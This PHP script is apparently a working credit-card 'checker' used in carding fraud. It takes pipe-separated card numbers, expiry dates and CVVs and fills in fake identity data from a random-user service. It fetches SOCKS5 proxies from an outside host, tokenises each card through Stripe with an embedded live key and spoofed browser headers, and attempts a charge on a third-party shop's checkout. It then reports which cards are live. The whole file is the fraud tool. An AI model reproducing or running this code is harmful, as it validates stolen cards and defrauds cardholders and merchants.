<?php 
/* 
 _______  _______  ___   _______  __   __  ___   _ 
|   _   ||       ||   | |       ||  | |  ||   | | |
|  |_|  ||    _  ||   | |       ||  |_|  ||   |_| |
|       ||   |_| ||   | |       ||       ||      _|
|       ||    ___||   | |      _||       ||     |_ 
|   _   ||   |    |   | |     |_ |   _   ||    _  |
|__| |__||___|    |___| |_______||__| |__||___| |_|

*/

error_reporting(0);
header("Cache-Control: no-cache, must-revalidate");
header("Expires: Sat, 1 Jul 2000 05:00:00 GMT");

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function generateRandomString($length = 10) {
  $characters = 'abcdefghijklmnopqrstuvwxyz';
  $charactersLength = strlen($characters);
  $randomString = '';
  for ($i = 0; $i < $length; $i++) {
      $randomString .= $characters[rand(0, $charactersLength - 1)];
  }
  return $randomString;
}

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\:\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];



$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

if($key != "CHK-0DR-FR8-DE0"){
  echo json_encode(["status" => 4, "response" => "Mantenimiento"]);
  exit;
}

$url = " https://mictlantecuhtlichkbot.herokuapp.com/";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, true);
$resp = curl_exec($curl);
curl_close($curl);
$proxy = str_replace("socks5|","", $resp);
$socks5 = explode("\n", $proxy);
$array_rnd = array_rand($socks5,1);
$proxy_use = $socks5[$array_rnd];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
//curl_setopt($ch, CURLOPT_PROXY, $proxy_use);
//curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Accept-Language: es-ES,es;q=0.9';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://js.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=6f9eaa5f-2578-4f79-b832-298c94b7bd6690834b&muid=d17a90aa-b616-41ae-9b9c-b209e3231f1bf1f15b&sid=78a2c978-5206-4966-bd0b-18627b420dd78c5845&payment_user_agent=stripe.js%2Fff3ddd6c4%3B+stripe-js-v3%2Fff3ddd6c4&time_on_page=13040&key=pk_live_Zr0d52ZJA1wFGrhLGcIT2ZhB&pasted_fields=number');
$stripe_data = curl_exec($ch);
$token = getStr($stripe_data,'"id": "','"');


if(empty($token)){
    if(strpos($stripe_data, "Your card number is incorrect")){
        echo json_encode(["status" => 2, "css" => $lista, "response" => "Your card number is incorrect."]);
        exit;
    }
    else {
      echo json_encode(["status" => 3, "css" => $lista, "response" => "Proxy Dead, Try-again..."]);
      exit;
    }
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.circusclothing.eu/cc_ie/checkout/#payment');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
$headers = array();
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Accept-Language: es-ES,es;q=0.9';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://js.stripe.com//';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'testmode=false&stripeToken='.$token.'&email=jason'.$last.'67%40gmail.com&amount_cents=1000&userid=&tracking=ME+X0G0+FEOWSME+NA&locale=es&country=MX&ga_id=&premium=true&premium_cid=0&premium_sid=0&currency=USD&recurring=true&subType=yearly&product=myadblock&experiment=&experiment_id=&variant=&variant_index=-1');
$response = curl_exec($ch);
if ($response) {
  if(strpos($response, 'success":true')){
      echo json_encode(["status" => 1, "css" => $lista, "response" => "Charge Success!"]);
      exit;
  }
  else if(strpos($response, "security code is incorrect.")){
      echo json_encode(["status" => 1, "css" => $lista, "response" => "Your card's security code is incorrect."]);
      exit;
  }
  else if(strpos($response, "security code is invalid.")){
      echo json_encode(["status" => 1, "css" => $lista, "response" => "Your card's security code is invalid."]);
      exit;
  }
  else if(strpos($response, "Your card was declined.")){
      echo json_encode(["status" => 2, "css" => $lista, "response" => "Your card was declined."]);
      exit;
  }
  else if(strpos($response, "Your card has insufficient funds.")){
      echo json_encode(["status" => 2, "css" => $lista, "response" => "Your card has insufficient funds."]);
      exit;
  }
  else if(strpos($response, "Your card has expired.")){
      echo json_encode(["status" => 2, "css" => $lista, "response" => "Your card has expired."]);
      exit;
  }
  else if(strpos($response, "Your card number is incorrect.")){
      echo json_encode(["status" => 2, "css" => $lista, "response" => "Your card number is incorrect."]);
      exit;
  }
  else if(strpos($response, "Your card does not support this type of purchase.")){
      echo json_encode(["status" => 2, "css" => $lista, "response" => "Your card does not support this type of purchase."]);
      exit;
  }
  else if(strpos($response, "Your card zip code is incorrect.")){
      echo json_encode(["status" => 2, "css" => $lista, "response" => "Your card zip code is incorrect."]);
      exit;
  }
  else if(strpos($response, 'card_error_authentication_required')){
      echo json_encode(["status" => 2, "css" => $lista, "response" => "card_error_authentication_required"]);
      exit;
  }
  else if(strpos($response, 'Invalid account.')){
      echo json_encode(["status" => 2, "css" => $lista, "response" => "Invalid account."]);
      exit;
  }
  else if(strpos($response, 'Customer authentication is required to complete this transaction')){
      echo json_encode(["status" => 2, "css" => $lista, "response" => "card_error_authentication_required"]);
      exit;
  }
  else {
      echo json_encode(["status" => 5, "css" => $lista, "response" => "Ha ocurrido un error, reintentando!"]);
      exit;
  }
}
else {
  echo json_encode(["status" => 3, "css" => $lista, "response" => "Proxy Dead, Try-again..."]);
  exit;
}
curl_close($ch);
?>